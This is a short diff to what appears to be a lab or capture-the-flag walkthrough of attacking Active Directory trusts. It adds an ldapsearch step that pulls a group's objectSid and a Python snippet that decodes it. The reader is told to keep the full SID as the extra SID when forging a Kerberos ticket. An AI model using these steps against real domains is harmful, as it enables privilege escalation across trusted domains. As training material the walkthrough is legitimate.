@@ -537,7 +537,19 @@ KRB5CCNAME=/tmp/krb5cc_celia LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI \
   "(cn=InfrastructureAdministrators)" objectSid 2>/dev/null | grep -i objectsid
 ```
 
-Decode → SID ending `-1603`. ⚠ save it.
+Decode the base64 blob (paste it in place of `<BASE64_SID>`):
+
+```bash
+python3 -c "
+import base64,struct
+d=base64.b64decode('<BASE64_SID>')
+n=d[1]; auth=int.from_bytes(d[2:8],'big')
+subs=struct.unpack('<%dI'%n, d[8:8+4*n])
+print('CROSSING SID (use whole thing):', 'S-%d-%d-'%(d[0],auth)+'-'.join(map(str,subs)))
+"
+```
+
+Result ends in `-1603`. ⚠ save the **whole** SID — it's your `-extra-sid` value (unlike the domain SID, do NOT drop the RID)
 
 ### Forge ticket (Kali T1) — ⚠ your aes key, source SID, crossing SID:
 
